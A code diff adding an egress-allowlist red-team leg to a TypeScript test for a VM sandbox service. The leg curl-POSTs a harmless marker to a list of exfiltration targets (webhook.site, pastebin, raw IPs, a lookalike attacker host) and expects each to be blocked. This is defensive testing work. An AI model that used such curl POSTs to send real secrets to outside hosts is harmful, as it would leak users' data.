@@ -42,6 +42,10 @@
  *   agent key's revoke (the session's end) deleting the key's VMs at once.
  *
  * Every VM, snapshot and agent key it makes is deleted by exact id at the end.
+ *
+ * --egress-allowlist adds the egress red team (RFD sandboxing-and-lockdown): a VM made with
+ * initialNetwork.egress {mode: "allowlist", presets: [anthropic, openai, github, npm, pypi]} must still reach
+ * api.anthropic.com and github.com, and must fail to POST a marker to an outside host or a raw IP (v4 and v6).
  */
 import { randomBytes } from "node:crypto";
 import { spawn } from "node:child_process";
@@ -54,6 +58,7 @@ const option = (name: string): string | undefined => {
 };
 const skipSleep = argv.includes("--skip-sleep");
 const lifecycle = argv.includes("--lifecycle");
+const egressAllowlist = argv.includes("--egress-allowlist");
 const cmuxPath = option("--cmux") ?? process.env["CMUX_PATH"] ?? "";
 // The headless VM CLI (workers/cmux-vm/cli, binary cmux-vm): the same library `cmux vm` links in process, for a run
 // whose cmux has no `vm` scope yet (the public cmux is built from main; `cmux vm` is on feat-cmux-next).
@@ -598,6 +603,72 @@ async function lifecycleCleanup(failed: string[]): Promise<void> {
   for (const [name, value] of Object.entries(proofs)) if (value === false) failed.push(`lifecycleCleanup.${name}`);
 }
 
+// ---- The egress allowlist red team (--egress-allowlist) ----
+
+/** An injected command that tries to send a secret out: every one must fail on an allowlisted VM. */
+const EXFIL_TARGETS = [
+  "https://example.com/",
+  "https://webhook.site/",
+  "https://pastebin.com/api/api_post.php",
+  "http://203.0.113.7/",
+  "https://1.1.1.1/",
+  "http://1.1.1.1/",
+  "https://[2606:4700:4700::1111]/",
+  "https://api.anthropic.com.attacker.example/",
+];
+const ALLOWED_TARGETS = ["https://api.anthropic.com/v1/messages", "https://github.com/"];
+
+async function egressAllowlistLeg(failed: string[]): Promise<void> {
+  const proofs: Record<string, unknown> = {};
+  result["egressAllowlist"] = proofs;
+  const presets = ["anthropic", "openai", "github", "npm", "pypi"];
+  const created = await timed("eaCreate", async () =>
+    expectStatus(
+      await call(
+        "POST",
+        "/v1/vms",
+        {
+          displayName: `egress allowlist ${runId}`.slice(0, 100),
+          idleTimeoutSeconds: 300,
+          autoDeleteSeconds: 3600,
+          initialNetwork: { publicEgress: false, egress: { mode: "allowlist", presets, domains: [] } },
+          labels: { purpose: "egress-redteam", run: runId.slice(0, 63), ...(useService ? { role: "chief" } : {}) },
+        },
+        { "idempotency-key": `egress-allowlist-${runId}` },
+        5 * 60_000,
+      ),
+      [201],
+      "POST /v1/vms (egress allowlist)",
+    ));
+  const id = field(created, "id");
+  if (typeof id !== "string" || !VM_ID.test(id)) throw new Error("the allowlisted create returned no VM id");
+  lifecycleVms.add(id);
+  // The receipt names what was applied: required names, the presets' names, the caller's.
+  const applied = field(field(created, "initialNetwork"), "allowedDomains");
+  proofs["allowedDomains"] = applied ?? null;
+  proofs["receiptConfirms"] = Array.isArray(applied) && applied.includes("api.anthropic.com") && !applied.includes("example.com");
+  if (proofs["receiptConfirms"] !== true) failed.push("egressAllowlist.receiptConfirms");
+  await timed("eaRunning", () => waitForState(id, "running", 5 * 60_000));
+  const code = async (url: string, post: boolean) => {
+    // A marker stands in for the secret; it is not one.
+    const data = post ? `-X POST --data-binary cmux-egress-redteam-${runId}` : "";
+    const out = await exec(id, `curl -sS -o /dev/null -w '%{http_code}' --max-time 12 ${data} '${url}' 2>/dev/null; true`, 60_000);
+    return out.stdout.trim() || "000";
+  };
+  const reached: Record<string, string> = {};
+  for (const url of ALLOWED_TARGETS) reached[url] = await timed(`eaAllowed ${url}`, () => code(url, false));
+  const exfil: Record<string, string> = {};
+  for (const url of EXFIL_TARGETS) exfil[url] = await timed(`eaExfil ${url}`, () => code(url, true));
+  proofs["allowed"] = reached;
+  proofs["exfil"] = exfil;
+  // Allowed: any HTTP answer (api.anthropic.com answers 4xx without a key). Exfil: no HTTP answer at all.
+  proofs["allowedReachable"] = Object.values(reached).every((c) => /^[1-5][0-9][0-9]$/.test(c));
+  proofs["exfilBlocked"] = Object.values(exfil).every((c) => c === "000");
+  for (const name of ["allowedReachable", "exfilBlocked"]) if (proofs[name] !== true) failed.push(`egressAllowlist.${name}`);
+  expectStatus(await call("DELETE", vmPath(id)), [204, 404], "DELETE allowlisted VM");
+  lifecycleVms.delete(id);
+}
+
 function summary(outcome: Record<string, unknown>): Record<string, unknown> {
   const error = typeof outcome["error"] === "string" ? { error: outcome["error"].replace(/\s+/g, " ").slice(0, 600) } : {};
   return {
@@ -630,7 +701,7 @@ for (const signal of ["SIGINT", "SIGTERM"] as const) {
 
 // The journey ends well inside the workflow's job timeout, so cleanup always runs.
 // The lifecycle leg adds about 25 minutes of creates, forks, snapshots and waits.
-const DEADLINE_MS = (lifecycle ? 70 : 25) * 60_000;
+const DEADLINE_MS = ((lifecycle ? 70 : 25) + (egressAllowlist ? 10 : 0)) * 60_000;
 const deadline = setTimeout(() => {
   console.error(`journey exceeded ${DEADLINE_MS}ms at stage ${stage}; cleaning up`);
   void cleanup().finally(() => {
@@ -778,6 +849,8 @@ try {
     const list = expectStatus(await call("GET", "/v1/vms"), [200], "GET /v1/vms");
     if (JSON.stringify(list).includes(id)) note("the deleted VM is still listed");
   });
+
+  if (egressAllowlist) await egressAllowlistLeg(failed);
 
   if (lifecycle) {
     await lifecycleApi(failed);
